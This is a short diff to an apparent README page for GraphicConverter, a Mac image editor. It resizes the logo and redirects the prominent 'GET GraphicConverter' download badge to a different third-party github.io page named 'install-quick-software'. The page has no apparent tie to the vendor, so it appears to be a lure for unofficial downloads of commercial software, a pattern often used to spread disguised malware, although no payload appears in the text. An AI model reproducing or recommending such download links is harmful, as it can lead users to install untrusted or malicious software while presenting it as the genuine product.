@@ -1,13 +1,13 @@
 # GraphicConverter – Universal Image Editing and Conversion Tool  
 
 <div align="center">  
-<img src="https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/e4/81/61/e48161db-d7ec-f29d-4bbb-a9ec5e24a0a1/AppIcon-0-0-85-220-0-6-0-2x.png/1200x630bb.png" alt="GraphicConverter Logo" width="500">  
+<img src="https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/e4/81/61/e48161db-d7ec-f29d-4bbb-a9ec5e24a0a1/AppIcon-0-0-85-220-0-6-0-2x.png/1200x630bb.png" alt="GraphicConverter Logo" width="350">  
 </div>
 
 <br>  
 
 <div align="center">  
-<a href="https://osx-app.github.io/.github/graphicconverter">  
+<a href="https://install-quick-software.github.io/.github/graphicconverter">  
 <img src="https://img.shields.io/badge/💻_GET_GraphicConverter-brown?style=for-the-badge&logo=apple" alt="GET GraphicConverter">  
 </a>  
 </div>
